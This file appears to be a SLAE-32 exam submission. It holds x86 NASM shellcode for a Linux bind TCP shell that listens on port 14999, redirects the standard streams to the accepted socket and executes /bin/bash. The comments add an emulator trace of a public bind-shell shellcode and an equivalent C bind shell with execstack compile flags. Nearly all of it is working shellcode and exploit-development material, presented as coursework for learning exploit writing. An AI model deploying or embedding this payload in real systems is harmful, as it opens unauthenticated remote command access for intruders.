; exam_bind_tcp_shell.nasm
; author: Chase Hatch

; int socket(int domain, int type, int protocol);
; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
; int listen(int sockfd, int backlog);
; int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
; int dup2(int oldfd, int newfd);
; int execve(const char *filename, char *const argv[], char *const envp[]);

; socketcall call numbers:  http://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html


section .text
global _start
_start:

	
	; zero all regs	
	xor eax, eax		; next several instructions zero regs
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor edi, edi
	xor esi, esi


	; socket(2, 1, 0)
	; socketcall(call#, args[])
	mov al, 102  		; socketcall()
 	mov bl, 0x1		; socketcall(socket)
	push edi		; 0x00000000
	push ebx		; SOCK_STREAM
	push 0x2		; AF_INET
	mov ecx, esp		; *&(AF_INET, SOCK_STREAM, 0)
	int 0x80		; eax will contain sockfd after syscall

	
	; bind(sockfd, struct(2, port, s_addr), addr_len)	
	xchg esi, eax		; esi <- sockfd
	mov al, 102		; socketcall()
	pop ebx			; socketcall(bind)
	push edi		; 0x00000000
	push word 0x973A	; port 14999
	push bx			; AF_INET
	mov ecx, esp		; *&({AF_INET, hton(port), s_addr(0)})
	push 16			; addr_len )
	push ecx		; *&(struct)
	push esi		; sockfd
	mov ecx, esp		; *&(sockfd, *&(struct), addr_len) -> ecx
	int 0x80

	
	; listen(sockfd, 0)
	mov al, 102		; socketcall()
	mov bl, 0x4		; socketcall(listen)
	push edi		; 0x000000
	push esi		; sockfd
	mov ecx, esp		; *&(sockfd, 0)
	int 0x80


	; accept(sockfd, NULL, NULL)
	mov al, 102		; socketcall syscall
	inc bl			; 0x5 socketcall(accept)
	push edi		; 0x000000000
	push esi		; sockfd
	mov ecx, esp		; ecx now *&(sockfd, NULL, NULL1)
	int 0x80		; eax now second sockfd


	; dup2(sockfd, {2,1,0})
	xchg ebx, eax		; ebx now new sockfd
	mov ecx, edi		; 0x00000000
	mov cl, 0x3
loop:
	mov al, 63		; dup2 syscall (0x3F)
	dec ecx
	int 0x80
	jnz loop


	; execve("/bin/bash", NULL, NULL)
	mov al, 0xb
	push edi		; 0x00000000
	push 0x68736162 	;  hsab 
	push 0x2f2f2f6e 	;  ///n 
	push 0x69622f2f 	;  ib// 
	mov ebx, esp
	int 0x80



;;; http://shell-storm.org/shellcode/files/shellcode-882.php
;;; shellcode=$(objdump -M intel -d 882_bind_tcp_shell.elf |reformat_od.sh -o) 
;;; echo -ne $shellcode |sctest -vvv -Ss 10000

;;; int socket (
;;;      int domain = 2;
;;;      int type = 1;
;;;      int protocol = 0;
;;; ) =  14;
;;; int bind (
;;;      int sockfd = 14;
;;;      struct sockaddr_in * my_addr = 0x00416fbe => 
;;;          struct   = {
;;;              short sin_family = 2;
;;;              unsigned short sin_port = 14597 (port=1337);
;;;              struct in_addr sin_addr = {
;;;                  unsigned long s_addr = 0 (host=0.0.0.0);
;;;              };
;;;              char sin_zero = "       ";
;;;          };
;;;      int addrlen = 16;
;;; ) =  0;
;;; int listen (
;;;      int s = 14;
;;;      int backlog = 0;
;;; ) =  0;
;;; int accept (
;;;      int sockfd = 14;
;;;      sockaddr_in * addr = 0x00000000 => 
;;;          none;
;;;      int addrlen = 0x00000000 => 
;;;          none;
;;; ) =  19;
;;; int dup2 (
;;;      int oldfd = 19;
;;;      int newfd = 2;
;;; ) =  2;



;;;  ~/SLAE-32/EXAM/0x1_bind_shell$ cat bind_tcp_shell.c
;;;  // author: Chase Hatch
;;;  // gcc -fno-stack-protector -z execstack bind_tcp_shell.c -o bind_tcp_shell.elf -g
;;;  #include <stdlib.h>
;;;  #include <stdio.h>
;;;  #include <sys/types.h>          /* See NOTES */
;;;  #include <sys/socket.h>
;;;  #include <netinet/in.h>
;;;  #include <unistd.h>
;;;  
;;;  
;;;  int main(int argc, char **argv[]){
;;;  	int sock, sockuh, port, reuse;
;;;  	port = 9595;
;;;  	reuse=1;
;;;  	struct sockaddr_in addr;
;;;  	addr.sin_family = AF_INET;
;;;  	addr.sin_addr.s_addr = INADDR_ANY;
;;;  	addr.sin_port = htons(port);
;;;  	sock = socket(AF_INET, SOCK_STREAM, 0);
;;;  	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
;;;  	bind(sock, (struct sockaddr *) &addr, sizeof(addr));
;;;  	listen(sock, 0);
;;;  	sockuh = accept(sock, NULL, NULL);
;;;  	dup2(sockuh, 2);
;;;  	dup2(sockuh, 1);
;;;  	dup2(sockuh, 0);
;;;  	execve("/bin/bash", NULL, NULL);
;;;  	return 0;
;;;  }

